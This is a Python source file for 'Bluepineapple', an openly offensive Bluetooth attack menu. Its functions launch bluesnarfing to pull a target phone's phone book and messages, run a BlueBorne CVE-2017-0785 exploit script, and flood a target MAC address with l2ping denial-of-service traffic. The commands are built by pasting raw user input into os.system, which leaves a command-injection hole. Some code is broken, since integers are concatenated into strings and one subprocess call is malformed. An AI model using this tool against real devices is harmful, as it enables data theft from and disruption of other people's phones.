import os
import argparse
import subprocess

parser = argparse.ArgumentParser(description='Bluepineapple is a project to integrate different bluetooth tools to simulate a Pineapple like device. It has been developed for using on Raspberry Pi 4 with Kali Linux installed.')
parser.add_argument('-i','--interface', help='Bluetooth interface, usually hci0',required=True)
args = parser.parse_args()

hci = args.interface

def bluelog(mode):
    if "scan" in mode:
        print("\n\nLogging options: m (manufacturer) n (name) c (class) v (verbose)")
        options = input("Write options (ex: mncv): ")

        os.system("sudo bluelog -i " + hci + " -" + options + " -o ./btdevices.log")

        print("\n\nEnd, devices logged in btdevices.log file")
    elif "show" in mode:
        print("\n\nDevices detected:")
        os.system("sudo cat btdevices.log")
    else:
        print("\n\nInvalid option.")

def blueranger():
    mac = input("\n\nWrite target MAC address: ")

    os.system("sudo blueranger " + hci + " " + mac)

def btlesniffer():
    print("\n\nPress CTRL + C to stop\n\n")
    os.system("sudo btlesniffer")

def sdptool():
    mac = input("\n\nWrite target MAC address: ")
    os.system("sudo sdptool -i " + hci + " browse -–tree –-l2cap "+ mac +" > target_" + mac + ".log")

def bluesnarfer_setup():
    subprocess.run(["sudo", "mkdir", "-p", "/dev/bluetooth/rfcomm"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "mknod", "-m", "666", "/dev/bluetooth/rfcomm/0", "c", "216", "0"], stdout=subprocess.DEVNULL)

##TODO: expand testing with older devices before further development
def bluesnarfer(mode):
    bluesnarfer_setup()
    mac = input("\n\nWrite target MAC address: ")
    mc = input("Write target channel for messages: ")
    pbc = input("Write target channel for phone book: ")
    dc = 2

    if "list" in mode:
        os.system("sudo bluesnarfer -b "" " + mac + " -C " + pbc + " -l")
    if "default_list" in mode:
        os.system("sudo bluesnarfer -b "" " + mac + " -C " + dc + " -l")
    elif "info" in mode:
        os.system("bluesnarfer -i -b " + mac)
    elif "pb" in mode:
        os.system("sudo bluesnarfer -b "" " + mac + " -r 1-100 -C " + pbc + " ME")
    else:
        print("Invalid option.")

def blueborne():
    mac = input("Write target MAC address: ")
    os.system("sudo python3 CVE-2017-0785.py TARGET=" + mac)

def DoS(seq, size):
    mac = input("Write target MAC address: ")
    subprocess.run(["sudo", "seq " + seq, ">", "numberofpings"], stdout=subprocess.DEVNULL)
    os.system("while read r; do l2ping -s " + size + " " + mac + "; done < numberofpings")

def jieggi_DoS():
    os.system("sudo python3 ./BLUETOOTH-DOS-ATTACK.py")

def welcome():
    print("\n\n")
    print("Bluepineapple by using.hacks. it scan, it attac but most importantly it work for old bt")

def menu():
    print("\n\n")
    print("1- Scan/show BT devices. Powered by Bluelog")
    print("2- Find/Link strength BT device in range. Powered by Blueranger")
    print("3- BT Sniffer. Powered by Btlesinffer")
    print("4- Detailed info of BT Target. Powered by sdptool")
    print("5- DoS attack. Powered by jieggil script.")
    print("6- Bluesnarfing attack. Powered by Bluesnarfer")
    print("7- Blueborne CVE for android.")
    print("8- DoS attack.")

def bye():
    print("\n\n")
    print("Bye Bye.")

def main():
    action = ""
    welcome()
    while "quit" not in action:
        menu()
        action = input("Choose action (write 'quit' to exit): ")

        if "1" in action:
            bluelog(input("Choose action (scan or show): "))
        elif "2" in action:
            blueranger()
        elif "3" in action:
            btlesniffer()
        elif "4" in action:
            sdptool()
        elif "5" in action:
            jieggi_DoS()
        elif "6" in action:
            mode = input("\n\nChoose action: ")
            bluesnarfer(mode)
        elif "7" in action:
            blueborne()
        elif "8" in action:
            DoS(100, 600)
        elif "quit" in action:
            bye()
        else:
            print("\n\nInvalid option.")

main()